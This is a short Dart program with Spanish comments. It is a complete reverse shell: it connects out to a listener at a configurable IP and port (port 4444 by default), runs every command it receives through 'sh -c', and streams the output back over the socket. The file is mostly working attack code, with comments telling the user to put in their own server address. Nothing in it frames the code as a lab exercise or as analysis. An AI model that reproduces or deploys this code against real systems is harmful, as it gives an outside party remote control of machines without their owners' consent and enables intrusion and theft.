import 'dart:io';
import 'dart:convert';

Future<void> main() async {
  // Configura la IP y el puerto del servidor de escucha
  var serverIp = '192.168.1.10'; // Cambia esto por la IP del servidor
  var serverPort = 4444; // Cambia esto por el puerto del servidor

  try {
    // Conectar al servidor remoto
    var socket = await Socket.connect(serverIp, serverPort);
    print('Conectado al servidor ${socket.remoteAddress.address}:${socket.remotePort}');

    // Escuchar comandos del servidor
    socket.listen((List<int> data) {
      var command = utf8.decode(data).trim();
      // Ejecutar el comando
      Process.start('sh', ['-c', command], runInShell: true).then((process) {
        process.stdout.transform(utf8.decoder).listen((output) {
          socket.write(output);
        });
        process.stderr.transform(utf8.decoder).listen((error) {
          socket.write(error);
        });
      });
    }, onDone: () {
      socket.destroy();
    });
  } catch (e) {
    print('No se pudo conectar al servidor: $e');
  }
}
